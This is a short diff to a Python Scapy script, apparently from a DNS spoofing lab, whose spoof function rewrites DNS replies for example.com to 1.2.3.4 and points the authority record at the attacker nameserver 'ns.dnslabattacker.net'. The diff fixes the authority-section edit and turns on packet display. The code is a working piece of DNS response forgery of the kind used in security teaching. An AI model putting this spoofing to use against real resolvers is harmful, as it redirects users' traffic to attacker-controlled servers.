@@ -24,10 +24,8 @@ def spoof(pkt):
 	if pkt[DNSQR].qname == 'example.com.':	
 		pkt[DNSRR].rdata = '1.2.3.4'
 		qname = pkt[DNSQR].qname
-		pkt[DNS].ns[DNSRR][0].rdata = 'ns.dnslabattacker.net.'
-		pkt[DNS].ns[DNSRR][1].rdata = 'ns.dnslabattacker.net.'
-		#print("OUTPUT: ", pkt[DNS].ns[DNSRR][1].rdata)
-		#pkt[DNS].ns = DNSRR(rrname=qname, rdata='ns.dnslabattacker.net.')
+		pkt[DNS].nscount = 1
+		pkt[DNS].ns[DNSRR].rdata = 'ns.dnslabattacker.net.'
 	return pkt
 
 def client(data):
@@ -43,7 +41,7 @@ def client(data):
 	    datarecv, server = sock_to_dns.recvfrom(4096)
 	    # print >>sys.stderr, 'received "%s"' % datarecv
 	    print >>sys.stderr, 'received %s bytes' % len(datarecv)
-	    #DNS(datarecv).show2()
+	    DNS(datarecv).show2()
 	    data_spoof = spoof(DNS(datarecv))
 	    #data_spoof.show2()
 	finally:
